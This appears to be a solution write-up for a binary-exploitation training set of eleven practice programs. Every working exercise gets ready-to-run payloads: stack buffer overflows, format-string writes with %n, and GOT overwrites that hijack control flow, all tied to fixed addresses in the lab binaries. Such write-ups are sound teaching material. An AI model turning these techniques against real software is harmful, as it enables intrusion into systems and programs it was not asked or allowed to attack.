# hole-in-bin

## Task description

Inside the /hole-in-bin directory, there are a set of binaries (ex00 to ex11) that need to be exploited. Each binary presents a unique challenge and tests different aspects of your knowledge about binary exploitation and reverse engineering. You can find more details in a README.txt file inside each exercise folder.

### ex00

**Objective:** Introduce buffer overflow by overflowing into the next variable's memory space.
**Vulnerability:** ``gets()`` function.

Command: `./bin 11111111111111111111111111111111111111111111111111111111111111111` 

or make a file with python like script.py

    payload = b'A' * 96 + b'\x01\x00\x00\x00'  
    with open('payload', 'wb') as f:
        f.write(payload)

Commands:
    `python3 script.py`
    `./bin < payload`

### ex01

**Objective:** Overflow involving a global variable.
**Vulnerability:** `strcpy()` function.

Command: `./bin 0000000000000000000000000000000000000000000000000000000000000000dcba`  

or make a file with python like script.py

    buffer_size = 64
    target_address = b'\x64\x63\x62\x61'  
    payload = b'A' * buffer_size + target_address
    print(payload.decode('latin1'))

Commands:
    `python3 script.py > payload.txt`
    `./bin "$(cat payload.txt)"`

### ex02

**Objective:** Overflow involving a global variable.
**Vulnerability:** `strcpy()` function.

Command: `GREENIE=$'0000000000000000000000000000000000000000000000000000000000000000\n\r\n\r' ./bin` 

or make a file with python like script.py

    buffer_size = 64  
    target_address = b'\x64\x63\x62\x61'  
    payload = b'A' * buffer_size + target_address
    with open('payload', 'wb') as f:
        f.write(payload)

Commands: 
    `python3 script.py`
    `export GREENIE=$(cat payload)`
    `./bin`

### ex03

**Objective:** Change the program's control flow by altering the value of a function pointer through buffer overflow.
**Vulnerability:** `gets()` function.

Command: `printf '0000000000000000000000000000000000000000000000000000000000000000\x24\x84\x04\x08' | ./bin` 

or make a file with python like script.py

    buffer_size = 64  
    target_address = b'\x24\x84\x04\x08'  
    payload = b'A' * buffer_size + target_address
    with open('payload', 'wb') as f:
        f.write(payload)

Commands: 
    `python3 script.py`
    `./bin < payload`

### ex04

**Objective:** Modify the program's control flow by changing the main function's return address (EBP + 4) using buffer overflow.
**Vulnerability:** `gets()` function.

Command: `printf '0000000000000000000000000000000000000000000000000000000000000000000000000000\xf4\x83\x04\x08' | ./bin`  

or make a file with python like script.py

    buffer_size = 76  
    target_address = b'\xf4\x83\x04\x08'  
    payload = b'A' * buffer_size + target_address
    with open('payload', 'wb') as f:
        f.write(payload)

Commands: 
    `python3 script.py`
    `./bin < payload`

### ex05

**Objective:** Write into a variable using overflow with a formatted string.
**Vulnerability:** s`printf()` without a format specifier.

Command: `./bin $(python2 -c 'print "A"*64 + "\xef\xbe\xad\xde"')` 

or `` ./bin $(python3 -c 'import sys; sys.stdout.write("A"*64 + "\xef\xbe\xad\xde")') `` 

### ex06

Broken task, see [Discord discussion](https://discord.com/channels/875324134530363395/1092707047516164187/1108688842392883243)

### ex07

**Objective:** Use a formatted string to write a value at a specified address.
**Vulnerability:** `printf()` without a format specifier.

Command: `python2 -c 'print "\xe4\x96\x04\x08%60x%4$n"' | ./bin`  

or `` python3 -c 'import sys; sys.stdout.buffer.write(b"\xe4\x96\x04\x08%60x%4$n")' | ./bin `` 

### ex08

**Objective:** Use a formatted string to write a value at a specified address.
**Vulnerability:** ``printf()` without a format specifier.

Command: `python2 -c 'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"%56x%12$n"+"%17x%13$n"+"%173x%14$n"' | ./bin`  

or `` python3 -c 'import sys; sys.stdout.buffer.write(b"\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08%56x%12$n%17x%13$n%173x%14$n")' | ./bin  `` 

### ex09

**Objective:** Change the address of exit in the GOT (0x080484b4) to the address of the hello function (0x80484b0). This will cause hello() to be called instead of exit().
**Vulnerability:** ``printf()` without a format specifier.

Command: `python2 -c 'print "\x24\x97\x04\x08"+"%33968x%4$hn"' | ./bin`  

or `` python3 -c 'import sys; sys.stdout.buffer.write(b"\x24\x97\x04\x08%33968x%4$hn")' | ./bin `` 

### ex10

**Objective:** Change [esp+0x1c] to 0x8048464 to call the winner function instead of nowinner.
**Vulnerability:** `strcpy()` function.

Command: `` ./bin `python2 -c 'print "A"*80+"\x64\x84\x04\x08"' ``

or `` ./bin $(python3 -c 'import sys; sys.stdout.write("A"*80 + "\x64\x84\x04\x08")') ``   

### ex11

**Objective:** Overflow the first strcpy() to alter the first parameter of the second strcpy() and modify the puts entry in the GOT table to call the winner function.
**Vulnerability:** `strcpy()` functions.

Command: `` ./bin `python2 -c 'print "A"*20+"\x74\x97\x04\x08"'` `python2 -c 'print "\x94\x84\x04\x08"' ``

or `` ./bin $(python3 -c 'import sys; sys.stdout.write("A"*20 + "\x74\x97\x04\x08")') $(python3 -c 'import sys; sys.stdout.write("\x94\x84\x04\x08")') `` 


